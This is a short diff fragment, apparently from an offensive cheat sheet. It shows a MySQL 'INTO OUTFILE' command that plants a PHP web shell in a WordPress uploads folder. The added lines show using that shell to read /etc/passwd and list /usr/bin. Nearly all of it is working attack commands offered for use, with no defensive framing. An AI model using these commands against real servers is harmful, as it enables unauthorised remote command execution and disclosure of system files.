@@ -14,3 +14,11 @@ ON MYSQL
 ========
 
 mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
+
+USE SHELL.PHP
+=============
+
+shell.php?cmd=cat+/etc/passwd
+
+shell.php?cmd=ls+/usr/bin
+
